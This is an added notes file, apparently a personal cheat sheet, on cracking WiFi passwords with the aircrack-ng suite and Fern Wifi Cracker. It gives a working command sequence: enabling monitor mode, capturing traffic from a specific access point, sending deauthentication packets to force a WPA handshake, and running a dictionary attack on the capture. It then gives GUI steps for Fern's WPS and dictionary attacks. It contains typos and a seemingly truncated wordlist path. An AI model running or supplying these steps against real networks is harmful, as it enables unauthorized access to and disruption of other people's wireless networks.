@@ -1,0 +1,23 @@
+Aircrack-ng is a full set of software designed to test WiFi network security. 
+It is not just a single tool but a collection of tools, each of which performs a particular purpose. Different areas of wifi security can be worked on, like monitoring the Access Point, testing, attacking the network, cracking the wifi network,and testing it.
+
+Airmon-ng is included in the aircrack-ng package and is used to enable and disable monitor mode on wireless interfaces.
+
+airdump-ng is used to list all the network around us and display useful information about them. 
+
+aireplay-ng is included in the aircrack-ng package.Aireplay-ng has many attacks that can deauthenticate wireless clients for the purpose of capturing WPA handshake data.
+
+
+airmon-ng start wlan0    //to start wlan0mon
+airodump-ng wlan0mon     //to see all access ponts & its stations or clients... the press cntrl+c key to stop the process
+airodump-ng --bssid 1C:A5:32:3A:36:F8 -c 1 -w /root/Desktop/wifiattack/att wlan0mon //to capture packet info to attack file..
+aireplay-ng -0 4 -a 1C:A5:32:3A:36:F8 wlan0mon // to deaunthacate send (0 means multiple Deauthentication packets... 4 means four Deauthentication packets) 
+aircrack-ng /root/Desktop/wifiattack/attack-01.cap -w /root/Desktop/fern
+----------------------------------------------------------------------------------------
+Using Fern Wifi Cracker: 
+1. Kali Linux>Wireless Attacks>Wireless Tools>fern-wifi-cracker from the menu or run fern-wificracker from the command line.
+2.Simply select your interface from the drop down list:
+Monitor mode will be automatically enabled and Fern will search for Access Points in the area. Once some are detected they will show up in either the WIFI WEP or WPA icon as seen below
+3.Clicking on the WIFI Icon will list every access point that your card can see in the area:
+4. Now simply select an access point from the Target Access Panel. Then select WPS or Regular attack and set password list file. 
+After specifying the dictionary file, click on wifi attack button.
